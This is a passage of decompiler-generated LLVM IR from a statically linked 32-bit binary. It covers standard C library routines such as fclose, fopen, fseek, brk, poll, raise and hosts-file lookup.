  %v6_80564b3 = or i32 %v3_80564b3, %v5_80564b3
  store i32 %v6_80564b3, i32* @ecx, align 4
  %v4_80564b5 = icmp eq i8 %v2_80564b3, 0
  br i1 %v4_80564b5, label %dec_label_pc_80564cc, label %dec_label_pc_80564b9

dec_label_pc_80564b9:                             ; preds = %dec_label_pc_80564b3.preheader, %dec_label_pc_80564af
  %v2_80564b383 = phi i8 [ %v2_80564b3, %dec_label_pc_80564af ], [ %v2_80564b376, %dec_label_pc_80564b3.preheader ]
  %v1_80564b382 = phi i8* [ %v1_80564b3, %dec_label_pc_80564af ], [ %v1_80564b375, %dec_label_pc_80564b3.preheader ]
  %v0_80564d081 = phi i32 [ %v1_80564b2, %dec_label_pc_80564af ], [ %v0_8056493.lcssa, %dec_label_pc_80564b3.preheader ]
  %v2_80564b9 = sext i8 %v2_80564b383 to i32
  store i32 %v2_80564b9, i32* @edx, align 4
  %v0_80564bc = load i32, i32* @global_var_805f61c, align 4
  store i32 %v0_80564bc, i32* @eax, align 4
  %v2_80564c1 = mul nsw i32 %v2_80564b9, 2
  %v3_80564c1 = add i32 %v0_80564bc, %v2_80564c1
  %v4_80564c1 = inttoptr i32 %v3_80564c1 to i8*
  %v5_80564c1 = load i8, i8* %v4_80564c1, align 1
  %v6_80564c1 = and i8 %v5_80564c1, 32
  %v7_80564c1 = icmp eq i8 %v6_80564c1, 0
  %v1_80564c5 = icmp eq i1 %v7_80564c1, false
  br i1 %v1_80564c5, label %dec_label_pc_80564af, label %dec_label_pc_80564c7

dec_label_pc_80564c7:                             ; preds = %dec_label_pc_80564b9
  %v10_80564c7 = icmp eq i8 %v2_80564b383, 10
  br i1 %v10_80564c7, label %dec_label_pc_80564af, label %dec_label_pc_80564cc

dec_label_pc_80564cc:                             ; preds = %dec_label_pc_80564af, %dec_label_pc_80564c7, %dec_label_pc_80564b3.preheader
  %v0_80564d0.lcssa = phi i32 [ %v0_8056493.lcssa, %dec_label_pc_80564b3.preheader ], [ %v0_80564d081, %dec_label_pc_80564c7 ], [ %v1_80564b2, %dec_label_pc_80564af ]
  %v1_80564b3.lcssa = phi i8* [ %v1_80564b375, %dec_label_pc_80564b3.preheader ], [ %v1_80564b382, %dec_label_pc_80564c7 ], [ %v1_80564b3, %dec_label_pc_80564af ]
  %v4_80564cc = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_80564d0 = load i8, i8* %v1_80564b3.lcssa, align 1
  %v3_80564d0 = icmp eq i8 %v2_80564d0, 0
  br i1 %v3_80564d0, label %dec_label_pc_80564dc, label %dec_label_pc_80564d5

dec_label_pc_80564d5:                             ; preds = %dec_label_pc_80564d0.preheader, %dec_label_pc_80564cc
  %v0_805648a = phi i32 [ %v0_80564d0.lcssa, %dec_label_pc_80564cc ], [ %v0_805645257, %dec_label_pc_80564d0.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_80564cc, %dec_label_pc_80564cc ], [ 0, %dec_label_pc_80564d0.preheader ]
  %v7_80564da = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_80564da, label %dec_label_pc_80564dc, label %dec_label_pc_8056486

dec_label_pc_80564dc:                             ; preds = %dec_label_pc_80564cc, %dec_label_pc_80564d5, %dec_label_pc_80564d0.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_80564d0.preheader ], [ %v4_80564cc, %dec_label_pc_80564cc ], [ %stack_var_-196.013, %dec_label_pc_80564d5 ]
  store i32 %tmp, i32* @edi, align 4
  %v0_80564e3 = load i32, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_805e367.1023 to i32), i32* %stack_var_-216, align 4
  %v5_80564eb = call i32 @__GI_strcoll(i8* %v4_80564eb, i32 ptrtoint ([11 x i8]* @global_var_805e367.1023 to i32), i32 %v0_80564e3, i32 %v0_80564e3)
  store i32 %v5_80564eb, i32* @eax, align 4
  store i32 1, i32* @esi, align 4
  %v1_80564f8 = icmp eq i32 %v5_80564eb, 0
  br i1 %v1_80564f8, label %dec_label_pc_8056520.preheader, label %dec_label_pc_8056531

dec_label_pc_8056520.preheader:                   ; preds = %dec_label_pc_80564dc
  %v5_805652490 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_805652490, label %dec_label_pc_8056526.lr.ph, label %dec_label_pc_8056531

dec_label_pc_8056526.lr.ph:                       ; preds = %dec_label_pc_8056520.preheader
  %v0_8056526.pre = load i32, i32* @global_var_8065f74.954, align 4
  br label %dec_label_pc_8056526

dec_label_pc_80564fe:                             ; preds = %dec_label_pc_8056526
  %v2_8056501 = mul i32 %v1_805650191, 4
  %v4_8056501 = add i32 %v2_8056501, %v3_8056501
  %v5_8056501 = inttoptr i32 %v4_8056501 to i32*
  %v6_8056501 = load i32, i32* %v5_8056501, align 4
  %v1_8056508 = inttoptr i32 %v6_8056501 to i8*
  %v2_8056508 = call i32 @__GI_strdup(i8* %v1_8056508)
  %v0_805650d = load i32, i32* @esi, align 4
  %v1_805650d = add i32 %v0_805650d, 1
  store i32 %v1_805650d, i32* @esi, align 4
  %v1_805650e = load i32, i32* @ebx, align 4
  %v2_805650e = mul i32 %v1_805650e, 4
  %v3_805650e = add i32 %v2_805650e, 134635368
  %v4_805650e = inttoptr i32 %v3_805650e to i32*
  store i32 %v2_8056508, i32* %v4_805650e, align 4
  %v0_8056515 = load i32, i32* @ebx, align 4
  %v1_8056515 = add i32 %v0_8056515, 1
  store i32 %v1_8056515, i32* @eax, align 4
  store i32 %v1_8056515, i32* @global_var_8065f74.954, align 4
  %v0_8056520.pre = load i32, i32* @esi, align 4
  %v5_8056524 = icmp slt i32 %v0_8056520.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8056524, label %dec_label_pc_8056526, label %dec_label_pc_8056531

dec_label_pc_8056526:                             ; preds = %dec_label_pc_8056526.lr.ph, %dec_label_pc_80564fe
  %v0_8056526 = phi i32 [ %v0_8056526.pre, %dec_label_pc_8056526.lr.ph ], [ %v1_8056515, %dec_label_pc_80564fe ]
  %v1_805650191 = phi i32 [ 1, %dec_label_pc_8056526.lr.ph ], [ %v0_8056520.pre, %dec_label_pc_80564fe ]
  store i32 %v0_8056526, i32* @ebx, align 4
  %v7_805652f = icmp sgt i32 %v0_8056526, 2
  br i1 %v7_805652f, label %dec_label_pc_8056531, label %dec_label_pc_80564fe

dec_label_pc_8056531:                             ; preds = %dec_label_pc_8056520.preheader, %dec_label_pc_80564fe, %dec_label_pc_8056526, %dec_label_pc_80564dc
  %v0_8056531 = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805e372.1024 to i32), i32* %stack_var_-216, align 4
  %v0_8056538 = load i32, i32* @edi, align 4
  %v4_8056539 = inttoptr i32 %v0_8056538 to i8*
  %v5_8056539 = call i32 @__GI_strcoll(i8* %v4_8056539, i32 ptrtoint ([7 x i8]* @global_var_805e372.1024 to i32), i32 %v0_8056531, i32 %v0_8056531)
  store i32 %v5_8056539, i32* @eax, align 4
  %v1_8056541 = icmp eq i32 %v5_8056539, 0
  br i1 %v1_8056541, label %dec_label_pc_8056583.preheader, label %dec_label_pc_8056545

dec_label_pc_8056545:                             ; preds = %dec_label_pc_8056531
  %v0_8056545 = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805e379.1025 to i32), i32* %stack_var_-216, align 4
  %v0_805654c = load i32, i32* @edi, align 4
  %v4_805654d = inttoptr i32 %v0_805654c to i8*
  %v5_805654d = call i32 @__GI_strcoll(i8* %v4_805654d, i32 ptrtoint ([7 x i8]* @global_var_805e379.1025 to i32), i32 %v0_8056545, i32 %v0_8056545)
  %v1_8056555 = icmp eq i32 %v5_805654d, 0
  br i1 %v1_8056555, label %dec_label_pc_8056583.preheader, label %dec_label_pc_80565c6.backedge

dec_label_pc_8056583.preheader:                   ; preds = %dec_label_pc_8056531, %dec_label_pc_8056545
  %v0_805658392 = load i32, i32* @global_var_8065f78.1018, align 8
  %tmp4594 = icmp slt i32 %v0_805658392, 1
  %tmp4695 = icmp eq i1 %tmp4594, false
  br i1 %tmp4695, label %dec_label_pc_805655b, label %dec_label_pc_805658c

dec_label_pc_805655b:                             ; preds = %dec_label_pc_8056583.preheader, %dec_label_pc_805655b.dec_label_pc_805655b_crit_edge
  %v0_805658396 = phi i32 [ %v0_8056583, %dec_label_pc_805655b.dec_label_pc_805655b_crit_edge ], [ %v0_805658392, %dec_label_pc_8056583.preheader ]
  %v1_805655b = add i32 %v0_805658396, -1
  store i32 %v1_805655b, i32* @global_var_8065f78.1018, align 8
  %v1_8056564 = mul i32 %v1_805655b, 4
  %v2_8056564 = add i32 %v1_8056564, 134635352
  %v3_8056564 = inttoptr i32 %v2_8056564 to i32*
  %v4_8056564 = load i32, i32* %v3_8056564, align 4
  %v1_805656b = call i32 @free(i32 %v4_8056564)
  %v0_8056570 = load i32, i32* @global_var_8065f78.1018, align 8
  %v1_8056578 = mul i32 %v0_8056570, 4
  %v2_8056578 = add i32 %v1_8056578, ptrtoint (i32* @global_var_8065f58.1026 to i32)
  %v3_8056578 = inttoptr i32 %v2_8056578 to i32*
  store i32 0, i32* %v3_8056578, align 4
  %v0_8056583 = load i32, i32* @global_var_8065f78.1018, align 8
  %tmp45 = icmp slt i32 %v0_8056583, 1
  %tmp46 = icmp eq i1 %tmp45, false
  br i1 %tmp46, label %dec_label_pc_805655b.dec_label_pc_805655b_crit_edge, label %dec_label_pc_805658c

dec_label_pc_805655b.dec_label_pc_805655b_crit_edge: ; preds = %dec_label_pc_805655b
  br label %dec_label_pc_805655b

dec_label_pc_805658c:                             ; preds = %dec_label_pc_805655b, %dec_label_pc_8056583.preheader
  %v0_8056583.lcssa = phi i32 [ %v0_805658392, %dec_label_pc_8056583.preheader ], [ %v0_8056583, %dec_label_pc_805655b ]
  store i32 1, i32* @esi, align 4
  %v5_80565b9100 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_80565b9100, label %dec_label_pc_80565bb, label %dec_label_pc_80565c6.backedge

dec_label_pc_8056593:                             ; preds = %dec_label_pc_80565bb
  %v2_8056596 = mul i32 %v1_8056596102, 4
  %v4_8056596 = add i32 %v2_8056596, %v3_8056501
  %v5_8056596 = inttoptr i32 %v4_8056596 to i32*
  %v6_8056596 = load i32, i32* %v5_8056596, align 4
  %v1_805659d = inttoptr i32 %v6_8056596 to i8*
  %v2_805659d = call i32 @__GI_strdup(i8* %v1_805659d)
  %v0_80565a2 = load i32, i32* @esi, align 4
  %v1_80565a2 = add i32 %v0_80565a2, 1
  store i32 %v1_80565a2, i32* @esi, align 4
  %v1_80565a3 = load i32, i32* @ebx, align 4
  %v2_80565a3 = mul i32 %v1_80565a3, 4
  %v3_80565a3 = add i32 %v2_80565a3, 134635352
  %v4_80565a3 = inttoptr i32 %v3_80565a3 to i32*
  store i32 %v2_805659d, i32* %v4_80565a3, align 4
  %v0_80565aa = load i32, i32* @ebx, align 4
  %v1_80565aa = add i32 %v0_80565aa, 1
  store i32 %v1_80565aa, i32* @global_var_8065f78.1018, align 8
  %v0_80565b5.pre = load i32, i32* @esi, align 4
  %v5_80565b9 = icmp slt i32 %v0_80565b5.pre, %stack_var_-196.0.lcssa
  br i1 %v5_80565b9, label %dec_label_pc_80565bb, label %dec_label_pc_80565c6.backedge

dec_label_pc_80565bb:                             ; preds = %dec_label_pc_805658c, %dec_label_pc_8056593
  %v1_8056596102 = phi i32 [ %v0_80565b5.pre, %dec_label_pc_8056593 ], [ 1, %dec_label_pc_805658c ]
  %v0_80565bb101 = phi i32 [ %v1_80565aa, %dec_label_pc_8056593 ], [ %v0_8056583.lcssa, %dec_label_pc_805658c ]
  store i32 %v0_80565bb101, i32* @ebx, align 4
  %v7_80565c4 = icmp sgt i32 %v0_80565bb101, 3
  br i1 %v7_80565c4, label %dec_label_pc_80565c6.backedge, label %dec_label_pc_8056593

dec_label_pc_8056453.preheader:                   ; preds = %dec_label_pc_8056453.preheader.lr.ph, %dec_label_pc_80565c6.backedge
  %v0_8056453.pre = load i32, i32* @ebx, align 4
  %v4_8056453.pre = load i32, i32* @ecx, align 4
  %v1_805645351 = inttoptr i32 %v0_8056453.pre to i8*
  %v2_805645352 = load i8, i8* %v1_805645351, align 1
  %v3_805645353 = zext i8 %v2_805645352 to i32
  %v5_805645354 = and i32 %v4_8056453.pre, -256
  %v6_805645355 = or i32 %v3_805645353, %v5_805645354
  store i32 %v6_805645355, i32* @ecx, align 4
  %v4_805645556 = icmp eq i8 %v2_805645352, 0
  br i1 %v4_805645556, label %dec_label_pc_80565c6.backedge, label %dec_label_pc_805645d.lr.ph

dec_label_pc_805645d.lr.ph:                       ; preds = %dec_label_pc_8056453.preheader
  %v0_8056460.pre = load i32, i32* @global_var_805f61c, align 4
  br label %dec_label_pc_805645d

dec_label_pc_80565e2:                             ; preds = %dec_label_pc_80565c6.backedge, %dec_label_pc_80565c6.preheader
  %v0_80565e5 = load i32, i32* @ebp, align 4
  %v1_80565e6 = inttoptr i32 %v0_80565e5 to i16*
  %v2_80565e6 = call i32 @__GI_fclose(i16* %v1_80565e6)
  br label %dec_label_pc_80565fb

dec_label_pc_80565f0:                             ; preds = %dec_label_pc_805642f
  %v0_80565f0 = call i32 @__GI___h_errno_location()
  %v1_80565f5 = inttoptr i32 %v0_80565f0 to i32*
  store i32 3, i32* %v1_80565f5, align 4
  br label %dec_label_pc_80565fb

dec_label_pc_80565fb:                             ; preds = %entry, %dec_label_pc_80565e2, %dec_label_pc_80565f0
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_80563e8, i32* @eax, align 4
  %v2_8056607 = call i32 @__pthread_return_void(i32 %v2_80563e8, i32 1)
  store i32 %v0_80563d4, i32* @ebp, align 4
  ret i32 %v2_8056607

; uselistorder directives
  uselistorder i32 %v0_8056460.pre, { 1, 0 }
  uselistorder i32 %v6_805645355, { 1, 0 }
  uselistorder i8 %v2_805645352, { 1, 2, 0 }
  uselistorder i8* %v1_805645351, { 1, 0 }
  uselistorder i32 %v0_8056453.pre, { 1, 0 }
  uselistorder i32 %v0_8056583, { 0, 2, 1 }
  uselistorder i32 %v1_805655b, { 1, 0 }
  uselistorder i32 %v0_8056526, { 1, 0 }
  uselistorder i32 %v0_8056520.pre, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_80564b9, { 1, 0 }
  uselistorder i8 %v2_80564b383, { 1, 0 }
  uselistorder i32 %v2_805649a, { 1, 0 }
  uselistorder i8 %v2_805649468, { 1, 0 }
  uselistorder i32 %v1_8056493, { 0, 2, 1, 3 }
  uselistorder i32 %v2_805645d, { 1, 0 }
  uselistorder i32 %v1_8056452, { 1, 0, 2 }
  uselistorder i32 %v2_80565cd, { 2, 3, 0, 1 }
  uselistorder i32 %v2_805643b, { 1, 0 }
  uselistorder i32 %v2_805641d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 1, 3, 4, 5, 2, 0, 6, 7, 9, 8 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 6, 5, 4, 3, 0, 2, 1 }
  uselistorder i32* @global_var_8065f78.1018, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 2, 1, 3, 4, 0 }
  uselistorder i32 164, { 2, 1, 0 }
  uselistorder i32* @global_var_8065f74.954, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_805f888.953 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_80565fb, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056453.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80565bb, { 1, 0 }
  uselistorder label %dec_label_pc_805655b, { 1, 0 }
  uselistorder label %dec_label_pc_8056583.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8056531, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8056526, { 1, 0 }
  uselistorder label %dec_label_pc_80564dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80564d5, { 1, 0 }
  uselistorder label %dec_label_pc_80564cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80564b9, { 1, 0 }
  uselistorder label %dec_label_pc_805649a, { 1, 0 }
  uselistorder label %dec_label_pc_80565c6.backedge, { 0, 3, 4, 2, 7, 6, 5, 1 }
  uselistorder label %dec_label_pc_80565c6.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_805663b = inttoptr i32 %arg3 to i32*
  %v10_805663b = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_805663b, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_805663b
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8056647 = call i32 @__libc_getpid()
  %v2_8056653 = call i32 @kill(i32 %v0_8056647, i32 %arg1)
  ret i32 %v2_8056653

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 3, 2, 1 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_805665c = load i32, i32* @eax, align 4
  %v1_805665c = add i32 %v0_805665c, 28
  %v2_805665c = inttoptr i32 %v1_805665c to i32*
  %v3_805665c = load i32, i32* %v2_805665c, align 4
  store i32 %v3_805665c, i32* @global_var_8065f7c.1027, align 4
  %v1_8056665 = add i32 %v0_805665c, 44
  %v2_8056665 = inttoptr i32 %v1_8056665 to i32*
  %v3_8056665 = load i32, i32* %v2_8056665, align 4
  store i32 %v3_8056665, i32* @global_var_8065f80.1028, align 128
  ret i32 %v3_8056665
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8056670 = load i32, i32* @ebx, align 4
  store i32 %v0_8056670, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8056683 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8056683, i32* @global_var_8065b44.1005, align 4
  %v7_805668e = icmp ult i32 %v1_8056683, %arg1
  %v1_8056690 = icmp eq i1 %v7_805668e, false
  br i1 %v1_8056690, label %dec_label_pc_80566a0, label %dec_label_pc_8056692

dec_label_pc_8056692:                             ; preds = %entry
  %v0_8056692 = load i32, i32* %stack_var_-4, align 4
  %v1_8056692 = call i32 @__errno_location(i32 %v0_8056692)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_805669a = inttoptr i32 %v1_8056692 to i32*
  store i32 12, i32* %v1_805669a, align 4
  %v0_80566a0.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80566a0

dec_label_pc_80566a0:                             ; preds = %entry, %dec_label_pc_8056692
  %v0_80566a0 = phi i32 [ 0, %entry ], [ %v0_80566a0.pre, %dec_label_pc_8056692 ]
  %v2_80566a4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80566a4, i32* @ebx, align 4
  ret i32 %v0_80566a0

; uselistorder directives
  uselistorder i32 %v1_8056683, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_8065b44.1005, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80566a0, { 1, 0 }
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80566a8 = load i32, i32* @edi, align 4
  store i32 %v0_80566a8, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_80566b8 = load i32, i32* @ebx, align 4
  %v1_80566b9 = inttoptr i32 %tmp4 to %pollfd*
  %v5_80566c0 = call i32 @poll(%pollfd* %v1_80566b9, i32 %tmp3, i32 %tmp)
  store i32 %v0_80566b8, i32* @ebx, align 4
  store i32 %v5_80566c0, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_80566c0, -4095
  br i1 %tmp10, label %dec_label_pc_80566d8, label %dec_label_pc_80566cc

dec_label_pc_80566cc:                             ; preds = %entry
  %v1_80566cc = call i32 @__errno_location(i32 %v0_80566b8)
  %v0_80566d1 = load i32, i32* %edi.global-to-local, align 4
  %v1_80566d1 = sub i32 0, %v0_80566d1
  %v2_80566d3 = inttoptr i32 %v1_80566cc to i32*
  store i32 %v1_80566d1, i32* %v2_80566d3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80566d8

dec_label_pc_80566d8:                             ; preds = %entry, %dec_label_pc_80566cc
  %v0_80566d8 = phi i32 [ %v5_80566c0, %entry ], [ -1, %dec_label_pc_80566cc ]
  %v2_80566dc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80566dc, i32* @edi, align 4
  ret i32 %v0_80566d8

; uselistorder directives
  uselistorder i32 %v5_80566c0, { 1, 0, 2 }
  uselistorder i32 %v0_80566b8, { 1, 0 }
  uselistorder label %dec_label_pc_80566d8, { 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_80566e7 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80566e7, i32* @esi, align 4
  %v1_80566eb = add i32 %v4_80566e7, 52
  %v2_80566eb = inttoptr i32 %v1_80566eb to i32*
  %v3_80566eb = load i32, i32* %v2_80566eb, align 4
  store i32 %v3_80566eb, i32* @ebp, align 4
  %v1_80566ee = icmp eq i32 %v3_80566eb, 0
  %v1_80566f0 = icmp eq i1 %v1_80566ee, false
  br i1 %v1_80566f0, label %dec_label_pc_8056711, label %dec_label_pc_80566f2

dec_label_pc_80566f2:                             ; preds = %entry
  %v1_80566f2 = add i32 %v4_80566e7, 56
  store i32 %v1_80566f2, i32* @ebx, align 4
  %v2_80566fc = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80566fc, i32* @eax, align 4
  %v2_8056701 = call i32 @__pthread_return_void(i32 %v2_80566fc, i32 134564427)
  %v0_8056706 = load i32, i32* @ebx, align 4
  %v1_8056709 = call i32 @__pthread_return_0(i32 %v0_8056706)
  store i32 %v1_8056709, i32* @eax, align 4
  %v0_8056713.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056711

dec_label_pc_8056711:                             ; preds = %entry, %dec_label_pc_80566f2
  %v0_805671b = phi i32 [ %v4_80566e7, %entry ], [ %v0_8056713.pre, %dec_label_pc_80566f2 ]
  store i32 0, i32* @edi, align 4
  %v1_8056713 = inttoptr i32 %v0_805671b to i8*
  %v2_8056713 = load i8, i8* %v1_8056713, align 1
  %v3_8056713 = and i8 %v2_8056713, 64
  %v4_8056713 = icmp eq i8 %v3_8056713, 0
  br i1 %v4_8056713, label %dec_label_pc_8056711.dec_label_pc_8056726_crit_edge, label %dec_label_pc_8056718

dec_label_pc_8056711.dec_label_pc_8056726_crit_edge: ; preds = %dec_label_pc_8056711
  br label %dec_label_pc_8056726

dec_label_pc_8056718:                             ; preds = %dec_label_pc_8056711
  %v1_805671c = inttoptr i32 %v0_805671b to i16*
  %v2_805671c = call i32 @fflush_unlocked(i16* %v1_805671c)
  store i32 %v2_805671c, i32* @edi, align 4
  %v0_8056729.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056726

dec_label_pc_8056726:                             ; preds = %dec_label_pc_8056711.dec_label_pc_8056726_crit_edge, %dec_label_pc_8056718
  %v0_8056729 = phi i32 [ %v0_805671b, %dec_label_pc_8056711.dec_label_pc_8056726_crit_edge ], [ %v0_8056729.pre, %dec_label_pc_8056718 ]
  %v1_8056729 = add i32 %v0_8056729, 4
  %v2_8056729 = inttoptr i32 %v1_8056729 to i32*
  %v3_8056729 = load i32, i32* %v2_8056729, align 4
  %v1_805672c = call i32 @__libc_close(i32 %v3_8056729)
  store i32 %v1_805672c, i32* @eax, align 4
  %v2_8056734 = icmp slt i32 %v1_805672c, 0
  %v1_8056736 = icmp eq i1 %v2_8056734, false
  br i1 %v1_8056736, label %dec_label_pc_805673b, label %dec_label_pc_8056738

dec_label_pc_8056738:                             ; preds = %dec_label_pc_8056726
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_805673b

dec_label_pc_805673b:                             ; preds = %dec_label_pc_8056726, %dec_label_pc_8056738
  %v0_805673b = load i32, i32* @esi, align 4
  %v1_805673b = add i32 %v0_805673b, 4
  %v2_805673b = inttoptr i32 %v1_805673b to i32*
  store i32 -1, i32* %v2_805673b, align 4
  %v2_805674d = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_805674d, i32* @ebx, align 4
  %v2_8056752 = call i32 @__pthread_return_void(i32 %v2_805674d, i32 134564427)
  %v1_805675e = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f658.923 to i32))
  %v0_8056763 = load i32, i32* @global_var_80638e4.1029, align 4
  %v1_8056768 = add i32 %v0_8056763, 1
  store i32 %v1_8056768, i32* @global_var_80638e4.1029, align 4
  store i32 ptrtoint (i32* @global_var_805f658.923 to i32), i32* @eax, align 4
  %v2_8056773 = call i32 @__pthread_return_void(i32 %v2_805674d, i32 1)
  store i32 %v2_8056773, i32* @eax, align 4
  %v0_805677b = load i32, i32* @esi, align 4
  %v1_805677b = inttoptr i32 %v0_805677b to i16*
  %v2_805677b = load i16, i16* %v1_805677b, align 2
  %v3_805677b = and i16 %v2_805677b, 24576
  store i16 %v3_805677b, i16* %v1_805677b, align 2
  %v0_8056780 = load i32, i32* @esi, align 4
  %v1_8056780 = inttoptr i32 %v0_8056780 to i16*
  %v2_8056780 = load i16, i16* %v1_8056780, align 2
  %v3_8056780 = or i16 %v2_8056780, 48
  store i16 %v3_8056780, i16* %v1_8056780, align 2
  br i1 %v1_80566f0, label %dec_label_pc_8056799, label %dec_label_pc_8056788

dec_label_pc_8056788:                             ; preds = %dec_label_pc_805673b
  %v2_805678c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805678c, i32* @eax, align 4
  %v2_8056791 = call i32 @__pthread_return_void(i32 %v2_805678c, i32 1)
  store i32 %v2_8056791, i32* @eax, align 4
  br label %dec_label_pc_8056799

dec_label_pc_8056799:                             ; preds = %dec_label_pc_805673b, %dec_label_pc_8056788
  %v0_8056799 = load i32, i32* @esi, align 4
  %v1_8056799 = add i32 %v0_8056799, 1
  %v2_8056799 = inttoptr i32 %v1_8056799 to i8*
  %v3_8056799 = load i8, i8* %v2_8056799, align 1
  %v4_8056799 = and i8 %v3_8056799, 64
  %v5_8056799 = icmp eq i8 %v4_8056799, 0
  br i1 %v5_8056799, label %dec_label_pc_80567ad, label %dec_label_pc_805679f

dec_label_pc_805679f:                             ; preds = %dec_label_pc_8056799
  %v1_80567a2 = add i32 %v0_8056799, 8
  %v2_80567a2 = inttoptr i32 %v1_80567a2 to i32*
  %v3_80567a2 = load i32, i32* %v2_80567a2, align 4
  %v1_80567a5 = call i32 @free(i32 %v3_80567a2)
  store i32 %v1_80567a5, i32* @eax, align 4
  br label %dec_label_pc_80567ad

dec_label_pc_80567ad:                             ; preds = %dec_label_pc_8056799, %dec_label_pc_805679f
  %v2_80567b9 = call i32 @__pthread_return_void(i32 %v2_805674d, i32 134564427)
  %v1_80567c5 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f658.923 to i32))
  store i32 ptrtoint (i32* @global_var_805f658.923 to i32), i32* @eax, align 4
  %v0_80567cc = load i32, i32* @global_var_80638e8.1030, align 8
  %v1_80567cc = add i32 %v0_80567cc, 1
  store i32 %v1_80567cc, i32* @global_var_80638e8.1030, align 8
  %v2_80567d5 = call i32 @__pthread_return_void(i32 %v2_805674d, i32 1)
  %v0_80567da = call i32 @_stdio_openlist_dec_use()
  %v0_80567e2 = load i32, i32* @edi, align 4
  ret i32 %v0_80567e2

; uselistorder directives
  uselistorder i32 (i32)* @__libc_close, { 16, 15, 14, 13, 33, 32, 31, 30, 29, 12, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80567ad, { 1, 0 }
  uselistorder label %dec_label_pc_8056799, { 1, 0 }
  uselistorder label %dec_label_pc_805673b, { 1, 0 }
  uselistorder label %dec_label_pc_8056726, { 1, 0 }
  uselistorder label %dec_label_pc_8056711, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_80567fb = inttoptr i32 %arg2 to i8*
  %v5_80567fb = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_80567fb, i32 0, i32 -1)
  ret i32 %v5_80567fb
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_805680f = ashr i32 %arg2, 31
  %v4_8056816 = inttoptr i32 %arg1 to i16*
  %v5_8056816 = call i32 @__GI_fseeko64(i16* %v4_8056816, i32 %arg2, i32 %v1_805680f, i32 %arg3)
  ret i32 %v5_8056816
}

